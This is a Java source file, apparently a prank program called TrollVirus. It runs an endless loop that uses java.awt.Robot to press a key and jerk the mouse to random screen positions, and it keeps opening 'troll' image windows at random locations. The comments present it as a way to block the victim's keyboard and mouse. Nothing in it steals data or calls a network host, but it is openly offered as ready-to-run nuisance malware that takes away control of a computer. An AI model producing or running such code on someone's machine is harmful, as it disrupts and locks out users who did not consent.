// Importing Packages

// javax.swing ->
import javax.swing.JWindow;
import javax.swing.ImageIcon;
import javax.swing.JLabel;

// java.awt ->
import java.awt.Dimension;
import java.awt.Toolkit;
import java.awt.AWTException;
import java.awt.Robot;

// java.awt.event ->
import java.awt.event.KeyEvent;

// java.util ->
import java.util.Objects;
import java.util.Random;


public class TrollVirus {

    private final Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
    private final int height = (int) screenSize.getHeight();
    private final int width = (int) screenSize.getWidth();
    private final Random random = new Random();


    // Blocking Keyboard and Mouse ;)
    public void BlockAll() throws AWTException {
        Robot _robot = new Robot();
        _robot.keyPress(KeyEvent.VK_0);
        _robot.mouseMove(random.nextInt(width), random.nextInt(height));
    }


    // PopUp Image, pic name -> troll
    public void Popup() {
        JWindow window = new JWindow();
        ImageIcon troll = new ImageIcon(Objects.requireNonNull(this.getClass().getResource("./troll.png")));
        JLabel label = new JLabel(troll, JLabel.CENTER);
        label.setIcon(troll);
        window.setSize(320,320);
        window.getContentPane().add(label);
        window.setLocation(random.nextInt(width), random.nextInt(height));
        window.setVisible(true);
    }


    // Infinite loop
    public static void main(String[] args) throws AWTException {
        TrollVirus virus = new TrollVirus();

        // You can replace while loop to for loop ;)
        // for (int i = 1; i <= 200; i++)
        // 200 can be replaced with any number ;)
        while (true) {
            virus.BlockAll();
            virus.Popup();
        }
    }
}